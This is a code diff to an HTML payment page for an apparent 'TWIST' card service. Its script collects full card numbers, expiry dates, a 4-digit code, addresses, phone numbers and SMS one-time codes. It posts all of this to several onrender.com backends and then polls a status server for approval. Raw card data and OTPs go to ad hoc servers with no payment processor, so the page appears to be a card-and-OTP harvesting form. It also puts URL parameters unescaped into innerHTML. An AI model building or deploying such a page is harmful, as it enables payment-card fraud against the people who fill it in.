@@ -58,7 +58,7 @@
       <div class="form-group">
         <label for="cardNumber">Card Number</label>
         <input type="text" id="cardNumber" maxlength="17" inputmode="numeric" required>
-        <!-- no 16-digit/prefix hint -->
+        <!-- removed prefix/16-digit hint per request -->
       </div>
 
       <div class="row">
@@ -72,7 +72,7 @@
         </div>
       </div>
 
-      <!-- First/Last Name removed per request -->
+      <!-- removed First Name / Last Name per request -->
 
       <div class="form-group">
         <label for="address">Address</label>
@@ -151,4 +151,190 @@
   const amountQP = qp.get('amount') || '';
   const ordernoQP = qp.get('orderno') || '';
   const emailQP  = qp.get('email') || '';
-  document.getElementById('amount').
+  document.getElementById('amount').value = amountQP;
+  document.getElementById('orderno').value = ordernoQP;
+  if (emailQP) document.getElementById('email').value = emailQP;
+  if (!ordernoQP || !amountQP) document.getElementById('autoFillNotice').classList.remove('hidden');
+  document.getElementById('orderDetails').innerHTML =
+    `Order Number: <strong>${ordernoQP || '-'}</strong><br>Total: <strong>$${amountQP || '-'}</strong>`;
+
+  /* ------------ Helpers ------------ */
+  function normalizePhoneToE164_CA(input) {
+    const digits = String(input || '').replace(/\D/g, '');
+    const last10 = digits.slice(-10);
+    return last10.length === 10 ? `+1${last10}` : null;
+  }
+
+  /* ------------ Masks / inputs ------------ */
+  const cardEl = document.getElementById('cardNumber');
+  const expEl = document.getElementById('expiration');
+  const twistEl = document.getElementById('twist');
+  const phoneEl = document.getElementById('otpPhone');
+  const otpEl = document.getElementById('otpCode');
+  const clientErr = document.getElementById('clientErr');
+
+  // group digits in blocks of 4; for 14 digits it will appear as "#### #### #### ##"
+  cardEl.addEventListener('input', function () {
+    let v = this.value.replace(/\D/g, '');
+    if (v.length > 14) v = v.slice(0, 14);
+    this.value = v.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+  });
+
+  // MMYY (digits only)
+  expEl.addEventListener('input', function () {
+    let v = this.value.replace(/\D/g, '');
+    this.value = v.slice(0, 4);
+  });
+
+  twistEl.addEventListener('input', function () {
+    this.value = this.value.replace(/\D/g, '').slice(0, 4);
+  });
+  phoneEl.addEventListener('input', () => {
+    const norm = normalizePhoneToE164_CA(phoneEl.value);
+    phoneEl.value = norm || '+1';
+  });
+  otpEl.addEventListener('input', () => {
+    otpEl.value = otpEl.value.replace(/\D/g, '').slice(0, 6);
+  });
+
+  /* ------------ OTP (lock the phone) ------------ */
+  const OTP_PHONE_KEY = 'twistpay:lastOtpPhone';
+  const sendOtpBtn = document.getElementById('sendOtpBtn');
+  const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+  const otpStatus = document.getElementById('otpStatus');
+  const sendOtpNote = document.getElementById('sendOtpNote');
+  const submitBtn = document.getElementById('submitBtn');
+
+  sendOtpBtn.onclick = async () => {
+    const normPhone = normalizePhoneToE164_CA(phoneEl.value);
+    if (!normPhone) return alert("Enter a valid Canadian number (e.g., +14165551234).");
+    localStorage.setItem(OTP_PHONE_KEY, normPhone);
+    sendOtpBtn.disabled = true;
+    sendOtpNote.textContent = "Sending...";
+    try {
+      const res = await fetch('https://twilio-otp-server.onrender.com/send-otp', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ phone: normPhone })
+      });
+      const data = await res.json();
+      sendOtpNote.textContent = data.success ? "OTP sent." : ("Error: " + (data.error||'Unknown error'));
+    } catch (e) {
+      sendOtpNote.textContent = `Network error: ${e.message}`;
+    } finally {
+      sendOtpBtn.disabled = false;
+    }
+  };
+
+  verifyOtpBtn.onclick = async () => {
+    const lockedPhone = localStorage.getItem(OTP_PHONE_KEY);
+    if (!lockedPhone) return alert("Please send an OTP first.");
+    const code = String(otpEl.value || '').trim();
+    if (!/^\d{6}$/.test(code)) return alert("Enter the 6-digit OTP code.");
+
+    otpStatus.textContent = "Verifying...";
+    otpStatus.style.color = "";
+    try {
+      const res = await fetch('https://twilio-otp-server.onrender.com/verify-otp', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ phone: lockedPhone, code })
+      });
+      const data = await res.json();
+      if (data.success) {
+        otpStatus.textContent = "✅ OTP verified!";
+        otpStatus.style.color = "green";
+        submitBtn.disabled = false;
+      } else {
+        otpStatus.textContent = `❌ Invalid OTP${data.error ? ' – ' + data.error : ''}`;
+        otpStatus.style.color = "red";
+        submitBtn.disabled = true;
+      }
+    } catch (e) {
+      otpStatus.textContent = `Network error: ${e.message}`;
+      otpStatus.style.color = "red";
+      submitBtn.disabled = true;
+    }
+  };
+
+  /* ------------ Submit ------------ */
+  function showErr(msg) {
+    clientErr.textContent = msg;
+    clientErr.classList.remove('hidden');
+    setTimeout(() => clientErr.classList.add('hidden'), 5000);
+  }
+
+  document.getElementById('paymentForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const rawCard = cardEl.value.replace(/\s/g, '');
+    if (!/^\d{14}$/.test(rawCard)) return showErr('Card must be 14 digits.');
+    if (!/^\d{4}$/.test(expEl.value)) return showErr('Expiration must be MMYY.');
+    if (!/^\d{4}$/.test(twistEl.value)) return showErr('TWIST Code must be 4 digits.');
+
+    const lockedPhone = localStorage.getItem(OTP_PHONE_KEY);
+    if (!lockedPhone) return showErr('Please send and verify an OTP first.');
+    if (!/^\d{6}$/.test(otpEl.value)) return showErr('OTP must be 6 digits.');
+
+    const transactionId = (crypto?.randomUUID && crypto.randomUUID()) || ('t_' + Math.random().toString(36).slice(2));
+
+    const payload = {
+      transaction_id: transactionId,
+      orderno: document.getElementById('orderno').value,
+      amount: document.getElementById('amount').value,
+      cardNumber: rawCard,                // 14 digits
+      expiration: expEl.value,            // MMYY
+      twist: twistEl.value,
+      name: document.getElementById('name').value,
+      email: document.getElementById('email').value,
+      phone: lockedPhone,                 // EXACT same phone used for OTP
+      postal: document.getElementById('postal').value,
+      // removed firstName/lastName per request
+      address: document.getElementById('address').value,
+      city: document.getElementById('city').value,
+      otpCode: document.getElementById('otpCode').value
+    };
+
+    document.getElementById('loadingSpinner').classList.remove('hidden');
+
+    try {
+      const pre = await fetch('https://twist-status-server.onrender.com/pre-validate', {
+        method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(payload)
+      });
+      const preData = await pre.json();
+      if (!pre.ok || !preData?.ok) {
+        document.getElementById('loadingSpinner').classList.add('hidden');
+        return showErr(preData?.message || 'Validation failed.');
+      }
+
+      await fetch('https://form-backend-p44w.onrender.com/submit-payment', {
+        method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(payload)
+      });
+
+      document.getElementById('paymentForm').classList.add('hidden');
+      document.getElementById('confirmationStep').classList.remove('hidden');
+      document.getElementById('loadingSpinner').classList.add('hidden');
+
+      let attempts = 0;
+      const interval = setInterval(async () => {
+        attempts++;
+        const res = await fetch('https://twist-status-server.onrender.com/client-check-status', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ transaction_id: transactionId })
+        });
+        const data = await res.json();
+        if (data.status === 'approved') {
+          clearInterval(interval);
+          document.getElementById('confirmationStep').classList.add('hidden');
+          document.getElementById('confirmationSuccess').classList.remove('hidden');
+        } else if (attempts >= 18) {
+          clearInterval(interval);
+          document.getElementById('confirmationStep').classList.add('hidden');
+          document.getElementById('confirmationDenied').classList.remove('hidden');
+        }
+      }, 5000);
+    } catch (err) {
+      document.getElementById('loadingSpinner').classList.add('hidden');
+      showErr("Network error: " + err.message);
+    }
+  });
+</script>
+</body>
+</html>
